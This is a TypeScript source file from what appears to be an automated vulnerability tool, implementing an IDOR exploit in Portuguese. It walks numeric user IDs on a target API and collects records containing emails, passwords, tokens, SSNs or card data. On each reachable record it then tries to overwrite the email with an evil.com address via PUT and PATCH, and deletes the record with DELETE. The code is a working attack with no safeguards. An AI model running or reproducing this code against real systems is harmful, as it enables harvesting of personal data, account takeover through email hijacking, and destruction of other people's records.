import { BaseExploit, ExploitResult } from './base';

interface IDORFinding {
  id: number | string;
  url: string;
  status: number;
  data: any;
  sensitiveFields: string[];
  size: number;
  modifications?: any[];
}

export class IDORExploit extends BaseExploit {
  getPayloads() {
    return [
      { name: 'ids_basicos', range: [1, 30] as [number, number], description: 'IDs b√°sicos de 1 a 30' },
      { name: 'ids_altos', range: [1000, 1020] as [number, number], description: 'IDs altos (poss√≠veis admins)' },
      { name: 'ids_negativos', range: [-10, -1] as [number, number], description: 'IDs negativos (bypass)' },
    ];
  }

  async testId(resourceId: number | string): Promise<IDORFinding | null> {
    const endpoint = this.vulnerability.endpoint || '/api/users/';
    const url = `${this.targetUrl}${endpoint}${resourceId}`;
    try {
      const response = await fetch(url, { method: 'GET', headers: { 'User-Agent': 'VulnHunter/1.0', 'Accept': 'application/json' } });
      if (response.ok) {
        const data = await response.json();
        const sensitiveFields: string[] = [];
        const dataStr = JSON.stringify(data).toLowerCase();
        ['email', 'password', 'token', 'cpf', 'ssn', 'credit_card', 'phone', 'address'].forEach(p => {
          if (dataStr.includes(p)) sensitiveFields.push(p);
        });
        return { id: resourceId, url, status: response.status, data, sensitiveFields, size: JSON.stringify(data).length };
      }
    } catch {}
    return null;
  }

  async testModification(userData: IDORFinding): Promise<any[]> {
    const endpoint = this.vulnerability.endpoint || '/api/users/';
    const url = `${this.targetUrl}${endpoint}${userData.id}`;
    const modifications: any[] = [];
    try {
      const modifiedData = { ...userData.data, email: `hacked_${userData.id}@evil.com` };
      const r = await fetch(url, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(modifiedData) });
      if (r.ok) modifications.push({ method: 'PUT', status: r.status });
    } catch {}
    try {
      const r = await fetch(url, { method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: `patched_${userData.id}@evil.com` }) });
      if (r.ok) modifications.push({ method: 'PATCH', status: r.status });
    } catch {}
    try {
      const r = await fetch(url, { method: 'DELETE' });
      if (r.ok) modifications.push({ method: 'DELETE', status: r.status, message: 'Recurso exclu√≠do!' });
    } catch {}
    return modifications;
  }

  async execute(): Promise<ExploitResult> {
    this.log(`üîç Iniciando varredura IDOR em ${this.targetUrl}`);
    const allFindings: IDORFinding[] = [];
    let sensitiveDataCount = 0;
    let modifiableCount = 0;

    for (const payload of this.getPayloads()) {
      const [start, end] = payload.range;
      this.log(`üì° Testando ${payload.name}: ${start} a ${end}`);
      for (let id = start; id <= end; id++) {
        const result = await this.testId(id);
        if (result) {
          this.log(`‚úÖ Recurso ${id} acess√≠vel!`, 'success');
          if (result.sensitiveFields.length > 0) sensitiveDataCount++;
          const modifications = await this.testModification(result);
          if (modifications.length > 0) {
            result.modifications = modifications;
            modifiableCount++;
            this.log(`‚ö†Ô∏è Recurso ${id} pode ser modificado!`, 'warning');
          }
          allFindings.push(result);
          this.addEvidence('idor_finding', {
            id: result.id,
            url: result.url,
            dataPreview: result.data,
            sensitiveFields: result.sensitiveFields,
            modifications: result.modifications || [],
          });
        }
        await new Promise(resolve => setTimeout(resolve, 300));
      }
    }

    this.results.exploits = allFindings;
    this.results.success = allFindings.length > 0;
    this.results.summary = {
      resourcesAccessed: allFindings.length,
      sensitiveData: sensitiveDataCount,
      totalAttempts: this.getPayloads().reduce((acc, p) => acc + (p.range[1] - p.range[0] + 1), 0),
    };
    this.log(`üéØ Total: ${allFindings.length} recursos acessados`);
    this.log(`üîê Dados sens√≠veis: ${sensitiveDataCount}`);
    this.log(`‚úèÔ∏è Modifica√ß√µes poss√≠veis: ${modifiableCount}`);
    return this.finalize();
  }
}
